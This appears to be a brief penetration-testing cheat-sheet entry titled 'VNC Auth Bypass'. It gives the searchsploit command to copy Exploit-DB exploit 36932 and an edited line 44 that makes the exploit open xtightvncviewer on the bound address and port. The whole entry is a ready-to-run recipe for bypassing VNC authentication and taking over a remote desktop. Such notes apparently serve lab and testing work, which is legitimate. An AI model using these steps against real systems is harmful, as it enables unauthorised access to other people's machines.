# VNC Auth Bypass

EDB
```
searchsploit -m 36932
```

Edit line 44 to use xtightvncviewer
```
thread.start_new_thread(os.system,('xtightvncviewer ' + BIND_ADDR + ':' + str(BIND_PORT),))
```